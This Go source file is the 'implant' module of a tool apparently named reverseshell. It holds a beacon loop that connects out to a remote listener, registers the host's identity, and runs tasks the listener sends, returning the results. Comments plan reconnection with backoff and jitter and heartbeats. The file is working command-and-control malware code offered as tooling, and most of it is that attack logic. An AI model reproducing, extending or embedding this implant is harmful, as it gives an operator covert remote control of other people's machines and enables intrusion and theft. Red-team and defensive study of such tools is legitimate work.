// Package agent implements the implant side: the beacon loop that connects
// out to a listener, registers, and executes tasks (README §3.3).
package agent

import (
	"context"
	"encoding/json"
	"fmt"

	"reverseshell/internal/protocol"
	"reverseshell/internal/transport"
)

// Version is the implant build version reported at registration.
const Version = "0.1.0"

// Config configures one beacon run.
type Config struct {
	Addr          string // listener "host:port"
	TransportName string
	MaxFrameBytes int
	Info          protocol.AgentInfo // identity sent in REGISTER
}

// Run dials the listener, registers, and serves tasks until the connection
// drops, the listener says BYE, or ctx is cancelled. Reconnection with
// backoff+jitter lands in F2; for now a dropped connection ends the run.
func Run(ctx context.Context, cfg Config) error {
	tr, err := transport.ByName(cfg.TransportName)
	if err != nil {
		return err
	}
	conn, err := tr.Dial(ctx, cfg.Addr, transport.Options{MaxFrameBytes: cfg.MaxFrameBytes})
	if err != nil {
		return fmt.Errorf("dial listener: %w", err)
	}
	defer conn.Close()

	reg := protocol.NewEnvelope(protocol.TypeRegister)
	data, err := json.Marshal(cfg.Info)
	if err != nil {
		return fmt.Errorf("marshal agent info: %w", err)
	}
	reg.Data = data
	if err := sendEnvelope(ctx, conn, reg); err != nil {
		return fmt.Errorf("send register: %w", err)
	}

	frame, err := conn.Recv(ctx)
	if err != nil {
		return fmt.Errorf("await registered: %w", err)
	}
	env, err := protocol.Decode(frame)
	if err != nil {
		return err
	}
	switch env.Type {
	case protocol.TypeRegistered:
		if env.SID == "" {
			return fmt.Errorf("listener assigned an empty session id")
		}
	case protocol.TypeError:
		var ep protocol.ErrorPayload
		_ = json.Unmarshal(env.Data, &ep)
		return fmt.Errorf("listener rejected registration: %s: %s", ep.Code, ep.Message)
	default:
		return fmt.Errorf("expected REGISTERED, got %s", env.Type)
	}
	sid := env.SID

	for {
		frame, err := conn.Recv(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return nil // cancelled from above: clean stop
			}
			return fmt.Errorf("session read: %w", err)
		}
		env, err := protocol.Decode(frame)
		if err != nil {
			return fmt.Errorf("bad envelope from listener: %w", err)
		}
		switch env.Type {
		case protocol.TypeTask:
			var spec protocol.TaskSpec
			var res protocol.TaskResult
			if err := json.Unmarshal(env.Data, &spec); err != nil {
				res = protocol.TaskResult{Status: protocol.StatusError, Detail: "bad task spec: " + err.Error()}
			} else {
				res = ExecuteTask(ctx, spec, cfg.Info)
			}
			out := protocol.NewEnvelope(protocol.TypeResult)
			out.SID = sid
			out.TID = env.TID
			rd, err := json.Marshal(res)
			if err != nil {
				return fmt.Errorf("marshal result: %w", err)
			}
			out.Data = rd
			if err := sendEnvelope(ctx, conn, out); err != nil {
				return fmt.Errorf("send result: %w", err)
			}
		case protocol.TypeBye:
			return nil
		case protocol.TypeAck:
			// Heartbeats land in F2; nothing to do yet.
		default:
			return fmt.Errorf("unexpected envelope %s", env.Type)
		}
	}
}

func sendEnvelope(ctx context.Context, conn transport.Conn, e *protocol.Envelope) error {
	b, err := protocol.Encode(e)
	if err != nil {
		return err
	}
	return conn.Send(ctx, b)
}
